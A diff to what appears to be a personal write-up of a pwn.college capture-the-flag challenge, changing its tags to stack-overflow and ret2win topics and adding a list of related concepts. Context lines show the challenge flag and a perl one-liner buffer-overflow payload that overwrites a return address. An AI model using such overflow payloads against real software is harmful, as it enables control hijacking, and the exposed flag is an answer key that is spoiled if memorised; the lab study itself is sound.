@@ -4,8 +4,10 @@ Tittle: Tricky Control Hijack - Hard
 Date & Time: 2026 - 08 - 26 11:48
 tags:
   - Challenge
-  - BinaryExploitation
-  - ROP
+  - Stack-Overflow
+  - ret2win
+  - Auth-Bypass
+  - Instruction-Skip
 ---
 ---
 ## FLAG  : `pwn.college{gMDOthm11cwCgSlyjJA2Hi3OWcI.dBDMzwiN4kDOyEzW}`
@@ -231,3 +233,7 @@ perl -e 'print "A"x104 . "\xd4\x1e\x40"."\x00"x5'
 - ROP Gadget is a usefull tool that contain a lot of useful instruction that help us on ROP case.
 
 ---
+
+---
+## Related Concepts : 
+[[Buffer Overflow]], [[ret2win]], [[ROPgadget]], [[GDB]], [[Assembly - Control Flow]], [[Assembly - Stack Operations]], [[perl]]
